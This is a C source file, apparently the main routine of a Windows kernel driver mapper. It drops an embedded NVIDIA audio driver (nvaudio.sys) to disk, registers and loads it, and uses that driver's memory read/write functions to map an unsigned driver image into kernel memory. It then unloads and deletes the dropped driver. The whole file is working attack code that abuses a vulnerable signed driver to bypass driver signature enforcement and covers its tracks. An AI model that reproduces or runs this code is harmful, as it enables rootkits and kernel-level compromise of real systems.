#include "main.h"

void _cdecl wmain(_In_ int argc, _In_ wchar_t* argv[])
{
    NTSTATUS status;
    HANDLE fileHandle;
    UNICODE_STRING unicodeString;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatus;
    HANDLE sectionHandle;
    PVOID ImageBase;
    SIZE_T ImageSize;
    DEVICE_DRIVER_OBJECT Driver;
    PUNICODE_STRING CurrentPath;
    LPWSTR DeviceName;
    LPWSTR DriverPath;
    LPWSTR ServiceName;

    if (argc != 2) {
        wprintf(L"[!] invalid arguments.\r\n\t%ws <Driver Path>\r\n", argv[0]);
        return;
    }

    if (RtlDosPathNameToNtPathName_U(argv[1], &unicodeString, NULL, NULL) == FALSE) {
        wprintf(L"[!] invalid object path, make sure it correct and exists: %ws.\r\n", argv[1]);
        return;
    }

    InitializeObjectAttributes(&objectAttributes, &unicodeString, (OBJ_CASE_INSENSITIVE), NULL, NULL);
    status = NtOpenFile(&fileHandle, FILE_EXECUTE, &objectAttributes, &ioStatus, FILE_SHARE_READ, 0);

    if NT_ERROR (status) {
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(status));
        return;
    }

    InitializeObjectAttributes(&objectAttributes, NULL, (OBJ_CASE_INSENSITIVE), NULL, NULL);
    status = NtCreateSection(&sectionHandle, SECTION_ALL_ACCESS, &objectAttributes, (PLARGE_INTEGER)NULL, PAGE_EXECUTE, SEC_IMAGE, fileHandle);

    if NT_ERROR (status) {
        NtClose(fileHandle);
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(status));
        return;
    }

    ImageBase = NULL;
    ImageSize = 0;
    status    = NtMapViewOfSection(sectionHandle, NtCurrentProcess(), &ImageBase, 0, 0, NULL, &ImageSize, ViewUnmap, 0, PAGE_EXECUTE);

    NtClose(sectionHandle);
    NtClose(fileHandle);
    if NT_ERROR (status) {
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(status));
        return;
    }

    ServiceName = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\NVR0Internal";
    DeviceName  = L"\\Device\\NVR0Internal";
    CurrentPath = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
    DriverPath  = RtlAllocateMemory(MAX_PATH * sizeof(WCHAR));

    StringCchCopyW(DriverPath, MAX_PATH, CurrentPath->Buffer);
    StringCchCatW(DriverPath, MAX_PATH, L"nvaudio.sys");

    status = WriteFileFromMemory(DriverPath, NvaudioDriver, sizeof(NvaudioDriver));
    if NT_ERROR (status) {
        PRINT_ERROR_STATUS(RtlNtStatusToDosError(status));

        NtUnmapViewOfSection(NtCurrentProcess(), ImageBase);
        return;
    }

    status = LoadDriver(&Driver.DeviceHandle, DriverPath, ServiceName, DeviceName);

    if NT_SUCCESS (status) {
        Driver.ReadMemory  = ReadSystemMemory;
        Driver.WriteMemory = WriteSystemMemory;

        status = MmLoadSystemImage(&Driver, ImageBase);
        wprintf(L"[+] Mapping result: 0x%08X.\r\n", status);

        UnloadDriver(Driver.DeviceHandle, ServiceName);
    }

    DeleteFileFromDisk(DriverPath);
    RtlFreeMemory(DriverPath);
    NtUnmapViewOfSection(NtCurrentProcess(), ImageBase);
    return;
}
